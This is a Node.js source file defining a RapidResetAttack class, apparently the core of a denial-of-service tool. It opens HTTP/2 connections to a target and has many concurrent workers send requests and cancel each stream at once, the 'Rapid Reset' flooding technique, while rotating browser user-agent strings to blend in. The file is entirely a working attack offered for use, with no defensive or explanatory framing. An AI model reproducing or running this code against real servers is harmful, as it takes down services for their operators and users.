// core/rapidReset.js
const http2 = require('http2');
const { performance } = require('perf_hooks');

class RapidResetAttack {
    constructor(target, concurrency, duration) {
        this.target = target;
        this.concurrency = concurrency;
        this.duration = duration * 60 * 1000;
        this.stats = { requests: 0, resets: 0, errors: 0 };
    }

    async attack() {
        const startTime = Date.now();
        const promises = [];

        for (let i = 0; i < this.concurrency; i++) {
            promises.push(this.worker());
        }

        await Promise.all(promises);
    }

    async worker() {
        const client = http2.connect(this.target);
        const endTime = Date.now() + this.duration;

        client.on('error', (err) => {
            this.stats.errors++;
            console.error(`Client error: ${err.message}`);
        });

        while (Date.now() < endTime) {
            try {
                const stream = client.request({
                    ':path': '/',
                    ':method': 'GET',
                    'user-agent': this.randomUA()
                });

                // Immediately reset the stream
                stream.close(http2.constants.NGHTTP2_CANCEL);
                this.stats.requests++;
                this.stats.resets++;
            } catch (err) {
                this.stats.errors++;
                // Exponential backoff on error
                await this.sleep(100);
            }
        }

        client.close();
    }

    randomUA() {
        const uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        ];
        return uas[Math.floor(Math.random() * uas.length)];
    }

    sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
}

module.exports = RapidResetAttack;
